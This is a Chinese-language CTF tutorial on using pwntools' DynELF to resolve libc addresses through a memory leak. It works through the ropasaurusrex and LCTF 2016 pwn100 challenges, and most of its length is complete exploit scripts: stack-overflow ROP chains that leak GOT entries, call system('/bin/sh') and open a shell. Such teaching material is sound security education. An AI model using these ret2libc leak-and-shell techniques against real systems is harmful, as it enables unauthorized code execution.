> 参考资料：
>
> [https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=42933&highlight=pwn](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=42933&highlight=pwn)
>
> 附件：
>
> 链接: [https://pan.baidu.com/s/1rLzeSuP099BfFveM5qOicA](https://pan.baidu.com/s/1rLzeSuP099BfFveM5qOicA)  密码: ocuw
>
> --来自百度网盘超级会员V3的分享
>

# DynELF引入
在讲述DynELF之前，我们先来看一道题，这道题是<font style="color:#515151;">PlaidCTF2013的ropasaurusrex，题目文件会在附件中提供下载。</font>

文件保护情况如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610424794703-443e56f1-42cc-4184-9da3-6f4d98b8ec6a.png)

文件题目比较老了，32位程序，只开启了NX保护，放入IDA中查看一下：



![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610424880014-2c96e801-70ae-4ac2-a9f3-43b972ee39ca.png)

进入sub_80483F4：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610424906927-0530887a-6995-4920-81cc-211e4be8c5ea.png)

可以看出，这是一个很简单的栈溢出，同时ELF文件中并没有发现system和“/bin/sh”，一道ret2libc3无疑了，在本机上进行攻击，exp如下：

```python
from pwn import *
context.log_level="debug"

p=process('./ropasaurusrex')
elf=ELF("./ropasaurusrex")
libc=ELF("/lib/i386-linux-gnu/libc.so.6")

write_plt=elf.plt['write']
read_got=elf.got['read']
main_addr=0x0804841D
payload=140*'a'+p32(write_plt)+p32(main_addr)+p32(1)+p32(read_got)+p32(4)
p.sendline(payload)
#gdb.attach(p)
leak_addr=u32(p.recv(4))
print "leak_addr",hex(leak_addr)
libc_base=leak_addr-libc.symbols['read']
print "leak libc_base",hex(libc_base)
system_addr=libc_base+libc.symbols['system']
bin_sh_addr=libc_base+libc.search('/bin/sh').next()
payload1=140*'a'+p32(system_addr)+'bbbb'+p32(bin_sh_addr)
p.sendline(payload1)
p.sendline('ls')
p.sendline('cat flag')
p.interactive()
```

emmm，假设题目并没有给你远程上的libc文件呢？没有给libc文件就无法getshell，因为libc的偏移不一样

你可能会说：那我在exp中引入一个库不就行了：

```python
from LibcSearcher import *
```

这的确是一个解决问题的方法，可是你想过没有，假如leak出来的地址符合太多libc的版本，你不可能一个一个试吧？（如果你够肝的话当我没说）

接下来就到了重点，我们开始讲解pwntools中的一个模块，他可以帮助我们直接找到远程上对应的libc版本并直接getshell，这个模块就是DynELF。利用pwntools的DynELF模块，对内存进行搜索（本地、远程都可以），直接得到我们需要的函数地址。

先来看一下官方文档中的例子（模版）：

> pwnlib.dynelf — 使用leak解析远程函数
>
> [https://pwntoolsdocinzh-cn.readthedocs.io/en/master/dynelf.html](https://pwntoolsdocinzh-cn.readthedocs.io/en/master/dynelf.html)
>

```python
# Assume a process or remote connection
#假设你要pwn本地或远程的一个ELF文件
p = process('./pwnme')

# Declare a function that takes a single address, and
# leaks at least one byte at that address.
# 声明一个可以接受leak出内存地址的函数，并在内存地址至少泄漏一个字节。
def leak(address):
    data = p.read(address, 4)
    log.debug("%#x => %s" % (address, (data or '').encode('hex')))
    return data

# For the sake of this example, let's say that we
# have any of these pointers.  One is a pointer into
# the target binary, the other two are pointers into libc
# 为了让这个例子更清楚，假设我们现在有三个地址（指针）
# 其中一个地址指向elf的中start（入口点）函数
# 其他两个地址指向libc
main   = 0xfeedf4ce
libc   = 0xdeadb000
system = 0xdeadbeef

# With our leaker, and a pointer into our target binary,
# we can resolve the address of anything.
#
# We do not actually need to have a copy of the target
# binary for this to work.

#使用可以泄露出地址的函数和指向elf文件的指针，可以解析内存中任何地址是用来干什么的
d = DynELF(leak, main)
assert d.lookup(None,     'libc') == libc
assert d.lookup('system', 'libc') == system

# However, if we *do* have a copy of the target binary,
# we can speed up some of the steps.
#当然，如果有拷贝下来（题目给的）的二进制文件，可以加速这一解析过程
d = DynELF(leak, main, elf=ELF('./pwnme'))
assert d.lookup(None,     'libc') == libc
assert d.lookup('system', 'libc') == system

# Alternately, we can resolve symbols inside another library,
# given a pointer into it.
# 当然也可以轮流的解析其他库中的符号，只要给一个指向它的指针
d = DynELF(leak, libc + 0x1234)
assert d.lookup('system')      == system
```

这是官方文档中的模板，当然还有更简单的：

```python
p = process('./xxx')
def leak(address):
  #各种预处理
  payload = "xxxxxxxx" + address + "xxxxxxxx" #用来泄露地址的payload
  p.send(payload)
  #各种处理
  data = p.recv(4) #接受泄露的地址
  log.debug("%#x => %s" % (address, (data or '').encode('hex')))
  return data
d = DynELF(leak, elf=ELF("./xxx"))      #初始化DynELF模块 
systemAddress = d.lookup('system', 'libc')  #在libc文件中搜索system函数的地址
```

显而易见，下面这个更清晰明了。

# DynELF使用条件
当然，这么好用的模块使用肯定有前提条件：

+ 目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；
+ 目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。

之前说过，这个模块可以对程序内存进行不断的搜索，因此，不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。

当然，以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write、puts（printf）这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。

# DynELF的使用-write（x86）
## 攻击方式
回忆一下Linux中write函数的用法，其函数原型如下：

函数定义：ssize_t write (int fd, const void * buf, size_t count); 

函数说明：write()会把参数buf所指的内存写入count个字节到参数放到所指的文件内。

返回值：如果顺利write()会返回实际写入的字节数。当有错误发生时则返回-1，错误代码存入errno中。

> int fd：0表示标准输入流stdin、1表示标准输出流stdout
>

write函数是对EynELF模块支持比较好的，因为write函数可以读取任意长度的内存信息，即它的打印长度只受size_t count参数控制（不会被\x00截断），缺点是需要传递3个参数，特别是在x64环境下，可能会带来一些麻烦。

在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop rdx; ret”等3个传参的gadget。此时，可以考虑使用__libc_csu_init函数的通用gadget，具体原理请参见：

> [https://www.yuque.com/cyberangel/rg9gdm/ka1885](https://www.yuque.com/cyberangel/rg9gdm/ka1885) #ret2__libc_csu_init
>

简单的说，就是通过__libc_csu_init函数的两段代码来实现3个参数的传递，这两段代码普遍存在于x64二进制程序中，只不过是间接地传递参数，而不像原来，是通过pop指令直接传递参数。

```python
.text:000000000040075A   pop  rbx  #需置为0，为配合第二段代码的call指令寻址
.text:000000000040075B   pop  rbp  #需置为1
.text:000000000040075C   pop  r12  #需置为要调用的函数地址，注意是got地址而不是plt地址，因为第二段代码中是call指令
.text:000000000040075E   pop  r13  #write函数的第三个参数
.text:0000000000400760   pop  r14  #write函数的第二个参数
.text:0000000000400762   pop  r15  #write函数的第一个参数
.text:0000000000400764   retn
```

第二段代码如下：

```python
.text:0000000000400740   mov  rdx, r13
.text:0000000000400743   mov  rsi, r14
.text:0000000000400746   mov  edi, r15d
.text:0000000000400749   call  qword ptr [r12+rbx*8]
```

这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可。

这样，我们便解决了write函数在leak信息中存在的问题，具体的应用会放到后面的3道题目中讲。

回过头来，之前那道题虽然是32位程序，但他包含write函数，我们使用DynELF重新做一下：

```python
#coding:utf-8
from pwn import *
context.log_level='debug'

p=process('./ropasaurusrex')
elf = ELF('./ropasaurusrex')

def leak(addr):
    start_addr = 0x08048340
    write_plt = elf.plt['write']
    payload = 140 * 'a' + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) + p32(4)
    p.sendline(payload)
    leak_addr = p.recv()[:4]
    print("%#x -> %s" %(addr, (leak_addr or '').encode('hex')))
    return leak_addr

d = DynELF(leak, elf =ELF("./ropasaurusrex"))

system_addr = d.lookup('system', 'libc')
read_addr = d.lookup('read', 'libc')

log.info("system_addr = %#x", system_addr)
log.info("read_addr = %#x", read_addr)

binsh_addr = 0x08049000 #给定一个任意的地址，用来存放接下来read读入的/bin/sh
payload1='A'*140+p32(read_addr)+p32(system_addr)+p32(0)+p32(binsh_addr)+p32(8)
p.sendline(payload1)
#gdb.attach(p)
p.sendline('/bin/sh\x00')
p.sendline('ls')
p.sendline('cat flag')
p.interactive()
```

对比原来的脚本，我们需要对其进行如下的修改：

+ 将原脚本中泄露地址的payload封装成一个名为leak的函数，并且将payload中要打印的got更改为函数leak的参数：addr
+ 接受数据时代码需要转变一下：

```python
---------------------------------------------------------------
#原payload
leak_addr=u32(p.recv(4))
print "leak_addr",hex(leak_addr)
---------------------------------------------------------------
#更改后：
leak_addr = p.recv()[:4] #或者是leak_addr=p.recv(4)
print("%#x -> %s" %(addr, (leak_addr or '').encode('hex')))
---------------------------------------------------------------
```

+ "/bin/sh"需要人为的手动使用read传入
+ 需要联网（最好翻墙），因为pwntools也需要寻找对应的libc
+ 要刷新栈，最好使用start

## 利用要点
+ 调用write函数来泄露地址信息，比较方便；
+ 32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；
+ 在泄露完函数地址后，需要重新调用一下_start函数（main函数也可以，但最好用start），用以恢复栈；

> 在确保自己写的exp没有出错的前提下，请在脚本附加gdb后再次运行，查看栈的情况。
>
> 在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。--**XDCTF2015-pwn200**
>

# DynELF的使用-puts、printf等（x64）
## 攻击方式
上面说过，write是不受截断限制的，但是有的题目中会出现puts、printf等输出函数，这些函数是会受到诸如'\0', '\n'之类的字符影响，因此会存在输出长度不固定的问题，加大了对数据的读取和处理的难度。那该怎么办？

---

puts的函数原型：

```c
#include <stdio.h>
int puts(const char *s);
```

> puts 函数使用的参数只有一个，即需要输出的数据的起始地址，**<font style="color:#F5222D;">它会一直输出直到遇到 \x00，所以它输出的数据长度是不容易控制的，我们无法预料到零字符会出现在哪里，截止后，puts 还会自动在末尾加上换行符 \n。</font>**该函数的优点是在 64 位程序中也可以很方便地使用。缺点是会受到零字符截断的影响，在写 leak 函数时需要特殊处理，在打印出的数据中正确地筛选我们需要的部分，如果打印出了空字符串，则要手动赋值\x00。
>

---

```c
#include <stdio.h>
int printf(const char *format, ...);
```

> 该函数常用于在格式化字符串中泄露内存，和 puts 差不多，也受到 `\x00` 的影响，只是没有在末尾自动添加 `\n`罢了。
>

---

> 题目来源：LCTF 2016-pwn100
>

老规矩，文件保护检查走一波：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610450644777-5ac5249f-6e49-4cbf-99bb-43bac49e005a.png)

64位程序，只开启了NX保护。IDA里看一下重要函数：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  sub_40068E();
  return 0LL;
}
---------------------------------------------------------------------
int sub_40068E()
{
  char v1; // [rsp+0h] [rbp-40h]

  sub_40063D((__int64)&v1, 200);
  return puts("bye~");
}
---------------------------------------------------------------------
void __cdecl sub_40063D(__int64 a1, signed int a2)
{
  signed int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i < a2; ++i )
    read(0, (void *)(i + a1), 1uLL);
}
```

可以看到，存在明显的栈溢出，同时不存在system和"/bin/sh"，用ret2__libc_csu_init写一下正常攻击的exp吧：

```python
#coding=utf-8
from pwn import *
context.log_level='debug'

p=process('./pwn100')
elf=ELF('./pwn100')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
pop_rdi_ret=0x400763
main_addr=0x4006B8
start_addr=0x400550
payload=72*'a'+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
payload=payload.ljust(200,'b')
p.send(payload)
leak_addr=u64(p.recv()[5:].ljust(8,'\x00'))-0xa000000000000
'''
[DEBUG] Received 0xc bytes:
    00000000  62 79 65 7e  0a a0 c6 a7  f7 ff 7f 0a               │bye~│····│····│
    0000000c
'''
print "success leak addr",hex(leak_addr)
libc_base=leak_addr-libc.symbols['puts']
print "success get libc_base",hex(libc_base)
system_addr=libc_base+libc.symbols['system']

ret2__libc_csu_init=0x40075A
read_got=elf.got['read']
read_bin_sh_to_memory=0x60107c  #0x601050
mov_call_addr=0x400740
payload2=72*'c'+p64(ret2__libc_csu_init)+p64(0)+p64(1)+p64(read_got)+p64(8)
payload2+=p64(read_bin_sh_to_memory)+p64(0)+p64(mov_call_addr)+'A'*56+p64(start_addr)
payload2=payload2.ljust(200,'e')
p.send(payload2)
p.send('/bin/sh\x00')
p.recvuntil('bye~')
#gdb.attach(p)
payload3=72*'a'+p64(pop_rdi_ret)+p64(read_bin_sh_to_memory)+p64(system_addr)+p64(0xdeadbeef)
payload3=payload3.ljust(200,'f')
p.sendline(payload3)

sleep(0.2)
p.sendline('ls')
sleep(0.2)
p.sendline('cat flag')
p.interactive()
```

当然，在本地使用DynELF是不允许挂载本地的libc的，我们尝试按原来的方法将如上脚本更改一下：

```python
#coding=utf-8
from pwn import *
#context.log_level='debug'

p=process('./pwn100')
elf=ELF('./pwn100')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

puts_plt = elf.plt['puts']
# puts_got=elf.got['puts']
pop_rdi_ret = 0x400763
main_addr = 0x4006B8
start_addr = 0x400550
def leak(addr):
    #payload=72*'a'+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
    payload=72*'a'+p64(pop_rdi_ret)+p64(addr)+p64(puts_plt)+p64(start_addr)
    payload=payload.ljust(200,'b')
    p.send(payload)
    #leak_addr=p.recv()[5:].ljust(8,'\x00')
    leak_addr=p.recv()[5:]
    log.info("%#x => %s" % (addr, (leak_addr or '').encode('hex')))
    return leak_addr
'''
[DEBUG] Received 0xc bytes:
    00000000  62 79 65 7e  0a a0 c6 a7  f7 ff 7f 0a               │bye~│····│····│
    0000000c
'''
#print "success leak addr",hex(leak_addr)
d=DynELF(leak,elf=elf)
system_addr = d.lookup('system', 'libc')
log.info("system_addr = %#x", system_addr)

#libc_base=leak_addr-libc.symbols['puts']
#print "success get libc_base",hex(libc_base)
#system_addr=libc_base+libc.symbols['system']

ret2__libc_csu_init=0x40075A
read_got=elf.got['read']
read_bin_sh_to_memory=0x60107c  #0x601050
mov_call_addr=0x400740
payload2=72*'c'+p64(ret2__libc_csu_init)+p64(0)+p64(1)+p64(read_got)+p64(8)
payload2+=p64(read_bin_sh_to_memory)+p64(0)+p64(mov_call_addr)+'A'*56+p64(start_addr)
payload2=payload2.ljust(200,'e')
p.send(payload2)
p.send('/bin/sh\x00')
p.recvuntil('bye~')
#gdb.attach(p)
payload3=72*'a'+p64(pop_rdi_ret)+p64(read_bin_sh_to_memory)+p64(system_addr)+p64(0xdeadbeef)
payload3=payload3.ljust(200,'f')
p.sendline(payload3)

sleep(0.2)
p.sendline('ls')
sleep(0.2)
p.sendline('cat flag')
p.interactive()
```

执行一下试试：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610509501679-8afb9742-fcdc-4273-a185-63d400824757.png)

诶？怎么报错了？按理说脚本应该没有问题才对？

通过查看输出的leak结果可以发现：

有大量的地址输出处理之后都是0x0a，即一个回车符。从Traceback上看，最根本原因是读取数据错误。这是因为puts()的输出是不受控的，作为一个字符串输出函数，它默认把字符’\x00’作为字符串结尾，从而截断了输出。因此根据这个原因，我们修改一下脚本：

```python
#coding=utf-8
from pwn import *
context.log_level='debug'

p=process('./pwn100')
elf=ELF('./pwn100')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

puts_plt = elf.plt['puts']
# puts_got=elf.got['puts']
pop_rdi_ret = 0x400763
main_addr = 0x4006B8
start_addr = 0x400550
def leak(addr):
    #payload=72*'a'+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
    payload=72*'a'+p64(pop_rdi_ret)+p64(addr)+p64(puts_plt)+p64(start_addr)
    payload=payload.ljust(200,'b')
    p.send(payload)
    p.recvuntil("bye~\n")
    count=0
    up=''
    leak_content=''
    while True:
        c=p.recv(numb=1,timeout=0.1)
        count+=1
        if up=='\n' and c=="":
            leak_content=leak_content[:-1]+'\x00'
            break
        else:
            leak_content+=c
            up=c

    leak_addr=leak_content[:4]
    #leak_addr=p.recv()[5:].ljust(8,'\x00')
    #leak_addr=p.recv()[5:]
    log.info("%#x => %s" % (addr, (leak_addr or '').encode('hex')))
    return leak_addr

'''
[DEBUG] Received 0xc bytes:
    00000000  62 79 65 7e  0a a0 c6 a7  f7 ff 7f 0a               │bye~│····│····│
    0000000c
'''
#print "success leak addr",hex(leak_addr)
d=DynELF(leak,elf=elf)
system_addr = d.lookup('system', 'libc')
log.info("system_addr = %#x", system_addr)

#libc_base=leak_addr-libc.symbols['puts']
#print "success get libc_base",hex(libc_base)
#system_addr=libc_base+libc.symbols['system']

ret2__libc_csu_init=0x40075A
read_got=elf.got['read']
read_bin_sh_to_memory=0x60107c  #0x601050
mov_call_addr=0x400740
payload2=72*'c'+p64(ret2__libc_csu_init)+p64(0)+p64(1)+p64(read_got)+p64(8)
payload2+=p64(read_bin_sh_to_memory)+p64(0)+p64(mov_call_addr)+'A'*56+p64(start_addr)
payload2=payload2.ljust(200,'e')
p.send(payload2)
p.send('/bin/sh\x00')
p.recvuntil('bye~')
#gdb.attach(p)
payload3=72*'a'+p64(pop_rdi_ret)+p64(read_bin_sh_to_memory)+p64(system_addr)+p64(0xdeadbeef)
payload3=payload3.ljust(200,'f')
p.sendline(payload3)

sleep(0.2)
p.sendline('ls')
sleep(0.2)
p.sendline('cat flag')
p.interactive()
```

来看一下脚本中重点内容：

> 注释都在代码中
>

```python
def leak(addr):
    #payload=72*'a'+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
    payload=72*'a'+p64(pop_rdi_ret)+p64(addr)+p64(puts_plt)+p64(start_addr)
    payload=payload.ljust(200,'b')
    p.send(payload) #payload泄露任意地址
    p.recvuntil("bye~\n")
    count=0
    up=''
    leak_content=''
    while True: #无限循环读取，防止recv()读取输出不全
        c=p.recv(numb=1,timeout=0.1) #每次读取一个字节，设置超时时间确保没有遗漏
        count+=1
        if up=='\n' and c=="": #上一个字符是回车且读不到其他字符，说明读完了
            leak_content=leak_content[:-1]+'\x00' #最后一个字符置为\x00
            break
        else:
            leak_content+=c #拼接输出
            up=c #保存最后一个字符

    leak_addr=leak_content[:4] #截取输出的一段作为返回值，提供给DynELF处理
    #leak_addr=p.recv()[5:].ljust(8,'\x00')
    #leak_addr=p.recv()[5:]
    log.info("%#x => %s" % (addr, (leak_addr or '').encode('hex')))
    return leak_addr
```

## 利用要点
和之前提到过的write函数不同，由于puts和printf的特性，我们需要对leak脚本进行处理，这样DynELF才会正常的执行，使用中需要注意的一点是，这种leak需要反复利用漏洞点，而在反复的函数跳转过程中，可能会使栈空间不稳定，这时，我们可以跳转到 __libc_start_main 中，重新布置栈空间。

<font style="color:#F5222D;">另外请注意，send和sendline千万不能混用，否则可能会给自身带来麻烦（如：栈无法对齐），这时请gdb.attach进行debug，来排除错误。</font>

> 本题就出现了错误，会另开一篇文章说
>

# 总结
虽然可以通过调用DynELF：**system_addr = d.lookup('system', 'libc')**来得到libc.so中system()在内存中的地址。要注意的是，**<font style="color:#F5222D;">通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址</font>**。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的空闲段（例如bss段，要求可读可写）中。

